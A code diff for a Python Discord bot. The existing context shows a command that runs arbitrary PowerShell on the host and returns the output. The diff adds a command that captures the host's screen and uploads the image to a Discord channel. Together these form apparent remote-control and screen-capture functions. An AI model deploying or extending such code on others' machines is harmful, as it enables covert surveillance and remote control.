@@ -9,7 +9,8 @@
 from interactions import slash_command, SlashContext
 from interactions import OptionType, slash_option
 from interactions import Client, Intents, listen
-from interactions import ChannelType
+from interactions import ChannelType, File
+import os
 #my imports
 from modules import basic_functions as functions
 #local settings
@@ -143,9 +144,31 @@ async def powershell(ctx: SlashContext, command: str):
         return
     # check if channel == main
     if ctx.channel_id != config_custom["main_channel_id"]:
-        await ctx.send("restart can only be executed in main.")
+        await ctx.send("powershell can only be executed in main.")
         return
     output = f"command output: ```{functions.powershell(command)}```"
     await ctx.send(output)
+#take sc
+@slash_command(
+    name="screenshot",
+    description="make a screenshot",
+)
+async def screenshot(ctx: SlashContext):
+    # load all channel ids
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("screenshot can only be executed in main.")
+        return
+    await functions.take_sc()
+    # send sc
+    await ctx.send(file=File(f'{os.getcwd()}/sc.png'))
+    #remove sc
+    os.remove(f'{os.getcwd()}/sc.png')
 #start bot
 bot.start(config["token"])
